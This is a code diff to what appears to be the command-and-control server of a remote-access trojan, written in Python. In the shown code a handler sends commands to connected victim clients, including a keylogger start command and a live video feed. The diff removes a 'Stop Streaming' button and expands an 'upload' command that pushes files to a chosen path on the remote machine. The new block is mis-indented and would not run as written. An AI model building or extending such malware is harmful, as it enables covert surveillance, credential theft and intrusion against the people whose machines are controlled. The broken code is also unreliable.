@@ -36,13 +36,6 @@ html_template = """
     <div>
       <img src="{{ url_for('video_feed') }}" width="640" height="480">
     </div>
-    
-    <!-- Stop Streaming Section -->
-    <div>
-      <a href="{{ url_for('stop_streaming') }}">
-        <button>Stop Streaming</button>
-      </a>
-    </div>
   </body>
 </html>
 """
@@ -162,11 +155,29 @@ def handle_client(client_socket, addr):
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + response)
 
-        elif command == "upload":
-            print(Fore.YELLOW + "[ * ]  Starting...")
-            # In this case, we're not asking for file input, just sending the command to the client
-            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + response)
+        elif command.startswith("upload"):
+    # Parse the upload command to extract file path and destination
+    try:
+        parts = command.split(' ')
+        if len(parts) < 3:
+            print(Fore.RED + "[ * ] Usage: upload <file_to_upload> -d <destination_path>")
+            continue
+        
+        file_to_upload = parts[1]
+        destination_path = parts[3] if '-d' in parts else None
+        
+        if not destination_path:
+            print(Fore.RED + "[ * ] Destination path not provided.")
+            continue
+
+        print(Fore.YELLOW + f"[ * ] Uploading {file_to_upload} to {destination_path}...")
+        client_socket.send(command.encode('utf-8'))  # Send upload command to client
+        response = client_socket.recv(4096).decode('utf-8', errors='ignore')
+        print(Fore.WHITE + response)
+
+    except Exception as e:
+        print(Fore.RED + f"[ * ] Error: {e}")
+
 
         elif command == "keyscan_start":
             start_keylogger()
